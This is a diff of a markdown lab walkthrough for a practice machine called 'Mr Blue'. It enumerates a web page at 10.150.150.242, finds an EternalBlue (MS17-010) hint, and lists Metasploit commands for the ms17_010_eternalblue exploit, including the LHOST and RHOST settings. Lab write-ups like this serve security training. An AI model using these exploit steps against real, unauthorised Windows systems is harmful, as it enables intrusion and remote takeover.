@@ -15,10 +15,13 @@ RECON:
 ENUMERATION:
 1. There are port 80 that open so go to browser and type the ip 10.150.150.242
 2. It will show this on the web
+   
 <img width="938" height="870" alt="image" src="https://github.com/user-attachments/assets/58dc4ba4-16ef-4ba8-a01b-391e729aeefe" />
-3. check source code for anything suspicious
+
+4. check source code for anything suspicious
 <img width="514" height="454" alt="image" src="https://github.com/user-attachments/assets/eef34a36-eb4c-48ce-b9d7-adbef8a7950e" />
-4. found vulnerable code in image name Mr Blue aka MS17-010 which is EternalBlue
+
+5. found vulnerable code in image name Mr Blue aka MS17-010 which is EternalBlue
 
 
 EXPLOITATION:
@@ -26,9 +29,11 @@ EXPLOITATION:
 2. run `msfconsole` to open metasploit console
 3. run `use exploit/windows/smb/ms17_010_eternalblue` 
 <img width="639" height="77" alt="image" src="https://github.com/user-attachments/assets/257446f8-902c-4d5e-b6bf-7a486765d190" />
+
 4. then set your local host `set LHOST <your ip address>`
 5. set victim host `set RHOST 10.150.150.242`
 <img width="639" height="128" alt="image" src="https://github.com/user-attachments/assets/baebb5a3-707d-40ab-a98f-398af3528e39" />
+
 6. then run
 <img width="639" height="425" alt="image" src="https://github.com/user-attachments/assets/dd2b548f-2a75-4390-ac0c-1b95882bba15" />
 
